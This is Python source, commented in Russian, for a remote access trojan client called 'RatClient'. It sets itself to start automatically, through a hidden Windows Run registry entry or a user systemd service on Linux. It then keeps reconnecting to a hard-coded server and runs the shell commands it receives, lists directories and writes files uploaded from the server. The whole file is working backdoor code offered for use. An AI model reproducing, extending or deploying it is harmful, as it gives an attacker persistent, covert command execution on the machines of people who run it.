import socket
import subprocess
import os
import sys
import time

SERVER_IP = "192.168.100.3"  # измените на IP сервера
SERVER_PORT = 5000
BUFFER_SIZE = 4096


def execute_command(command):
    try:
        return subprocess.getoutput(command)
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"


def is_windows():
    return os.name == 'nt'


def add_to_autostart_windows():
    try:
        import winreg
    except ImportError:
        return False, "Модуль winreg не доступен"
    try:
        exe_path = sys.executable
        script_path = os.path.abspath(__file__)
        if exe_path.lower().endswith("python.exe"):
            pythonw_path = exe_path[:-4] + "w.exe"
            if os.path.exists(pythonw_path):
                exe_path = pythonw_path

        cmd = f'"{exe_path}" "{script_path}"'

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RatClient", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        return True, "Добавлено в автозагрузку Windows"
    except Exception as e:
        return False, f"Ошибка при добавлении в автозагрузку Windows: {e}"


def is_in_autostart_windows():
    try:
        import winreg
    except ImportError:
        return False
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_READ)
        i = 0
        while True:
            name, _, _ = winreg.EnumValue(key, i)
            if name == "RatClient":
                return True
            i += 1
    except OSError:
        return False


def add_to_autostart_linux():
    home = os.path.expanduser("~")
    systemd_dir = os.path.join(home, ".config", "systemd", "user")
    if not os.path.isdir(systemd_dir):
        os.makedirs(systemd_dir, exist_ok=True)

    service_path = os.path.join(systemd_dir, "ratclient.service")

    python_path = sys.executable
    script_path = os.path.abspath(__file__)

    service_content = f"""[Unit]
Description=Rat Client Service
After=network-online.target

[Service]
ExecStart={python_path} {script_path}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""

    if os.path.exists(service_path):
        with open(service_path, "r", encoding="utf-8") as f:
            existing = f.read()
        if existing == service_content:
            return True, f"systemd сервис уже установлен: {service_path}"

    try:
        with open(service_path, "w", encoding="utf-8") as f:
            f.write(service_content)
    except Exception as e:
        return False, f"Ошибка записи файла systemd unit: {e}"

    try:
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
        subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
    except Exception as e:
        return False, f"Ошибка в systemctl: {e}"

    return True, f"systemd сервис установлен и запущен: {service_path}"


def is_in_autostart_linux():
    home = os.path.expanduser("~")
    service_path = os.path.join(home, ".config", "systemd", "user", "ratclient.service")
    return os.path.exists(service_path)


def add_self_to_autostart():
    if is_windows():
        if not is_in_autostart_windows():
            success, msg = add_to_autostart_windows()
            print(msg)
        else:
            print("Уже добавлен в автозагрузку Windows")
    else:
        if not is_in_autostart_linux():
            success, msg = add_to_autostart_linux()
            print(msg)
            print("Если сервис не стартует после перезагрузки, выполните:")
            print("sudo loginctl enable-linger $USER")
        else:
            print("Уже добавлен в systemd автозапуск")


def main():
    try:
        add_self_to_autostart()
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[INFO] Подключились к серверу {SERVER_IP}:{SERVER_PORT}")
        except Exception:
            print("[WARN] Не удалось подключиться к серверу, пауза 5 секунд...")
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                command = data.decode(errors='ignore')
                if not command:
                    break
                if command == "exit":
                    break

                if command.startswith("cmd:"):
                    cmd = command[4:].strip()

                    if "nohup" in cmd:
                        try:
                            subprocess.Popen(cmd, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            s.send("Команда запущена через nohup".encode())
                        except Exception as e:
                            s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                        continue

                    if cmd.endswith('&'):
                        cmd_no_amp = cmd.rstrip('&').strip()
                        try:
                            subprocess.Popen(cmd_no_amp, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            s.send("Команда выполнена в фоне".encode())
                        except Exception as e:
                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode())
                        continue

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            s.send(f"Сменена директория на {os.getcwd()}".encode())
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode())

                    elif cmd.startswith("ls"):
                        path = cmd[2:].strip()
                        if not path or path == "~":
                            path = os.path.expanduser("~")
                        try:
                            entries = os.listdir(path)
                            dirs = [e + '/' for e in entries if os.path.isdir(os.path.join(path, e))]
                            files = [e for e in entries if not os.path.isdir(os.path.join(path, e))]
                            s.send(("\n".join(sorted(dirs + files))).encode())
                        except Exception:
                            s.send("Ошибка: недостаточно прав для открытия данного файла/папки".encode())

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode())

                elif command.startswith("upload:"):
                    filepath = command[len("upload:"):].strip()
                    try:
                        with open(filepath, "wb") as f:
                            total_received = 0
                            while True:
                                chunk = s.recv(BUFFER_SIZE)
                                if chunk == b"__file_transfer_end__" or not chunk:
                                    break
                                f.write(chunk)
                                total_received += len(chunk)
                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
                        print(f"[INFO] Файл {filepath} сохранён, размер: {total_received} байт")
                    except Exception as e:
                        s.send(f"Ошибка при сохранении файла: {e}".encode())
                        print(f"[ERROR] Ошибка при сохранении файла: {e}")

                # -- Остальные команды (delete, download, kill и др.) -- 
                # оставляйте без изменений или аналогично реализуйте

        except Exception as e:
            print(f"[ERROR] Ошибка в основном цикле: {e}")
        finally:
            s.close()

        time.sleep(5)


if __name__ == "__main__":
    main()
